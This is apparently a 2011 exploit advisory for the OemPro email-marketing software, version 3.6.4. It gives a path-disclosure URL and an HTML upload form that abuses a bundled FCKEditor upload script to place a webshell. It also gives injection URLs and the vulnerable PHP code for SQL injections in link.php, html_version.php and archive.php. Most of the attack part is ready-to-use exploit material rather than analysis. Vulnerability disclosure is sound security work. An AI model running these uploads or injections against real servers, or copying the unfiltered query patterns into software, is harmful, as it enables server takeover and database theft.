@@ -1,0 +1,69 @@
+# Exploit title: Multiple vulnerabilities on OemPro
+# Product: OemPro
+# Version Affected: v3.6.4 and probably prior.
+# Date: 03/02/2011
+# Author: Ignacio Garrido
+# Vendor: http://octeth.com
+# Tested on: Linux - Windows 2003
+# Mail: Ign.sec@gmail.com
+
+# Path disclosure:
+http://localhost/cli_bounce.php
+
+# FCKEditor 2.3.2 is used, file upload vulnerabilities have been found
+before (Credits to grabz), making possible to bypass any kind of restriction
+when uploading a media file.
+# A malintentioned user could exploit this flaw to upload a webshell. Perms
+to create a folder are needed though.
+# Vulnerable file:
+http://localhost/system/data/editors/fckeditor/editor/filemanager/upload/php/upload.php?Type=Media
+# Possible upload path:
+http://localhost/system/data/user_uploads/Image/
+http://localhost/user_uploads/image/
+
+# Exploit:
+<form enctype="multipart/form-data" action="
+http://localhost/system/data/editors/fckeditor/editor/filemanager/upload/php/upload.php?Type=Media"
+method="post">
+<input name="NewFile" type="file">
+<input type="submit" value="Subir">
+</form>
+
+
+# Several SQL injections have been found all the encoded input data it's
+only being decoded but not properly filtered.
+# A few examples:
+
+# link.php, line 123 to 126
+http://localhost/link.php?URL=[ENC URL]&Name=&EncryptedMemberID=[ENCODED
+SQLI]&CampaignID=9&CampaignStatisticsID=16&Demo=0&Email=[MAIL]
+
+    $SQLQuery = "SELECT * FROM ".$ArrayConfig['Database']['Prefix']."members
+WHERE MemberID='".$MemberID."'";
+    $ResultSet = ExecuteMySQLQuery($SQLQuery);
+    $ArrayMember = mysql_fetch_assoc($ResultSet);
+
+# html_version.php, line 43 to 48
+http://localhost/html_version.php?ECID=[SQL]
+
+    $EncryptedCampaignID    = ($_GET['ECID'] == '' ?
+$_POST['FormValue_ECID'] : $_GET['ECID']);
+
+        if ($EncryptedCampaignID != '')
+            {
+            $CampaignID = base64_decode(rawurldecode($EncryptedCampaignID));
+            $PublicDisplay = true;
+            }
+
+# archive.php
+http://localhost/archive.php?ArchiveID=
+
+    $ArchiveListID            = ($_GET['ArchiveID'] == '' ?
+$_POST['FormValue_ArchiveID'] : $_GET['ArchiveID']);
+    $ArchiveListID        = base64_decode($ArchiveListID);
+
+    $SQLQuery ="SELECT * FROM
+".$ArrayConfig['Database']['Prefix']."archive_list WHERE
+ArchiveListID='".$ArchiveListID."'";
+    $ResultSet = ExecuteMySQLQuery($SQLQuery);
+    $ArrayArchive = mysql_fetch_assoc($ResultSet);
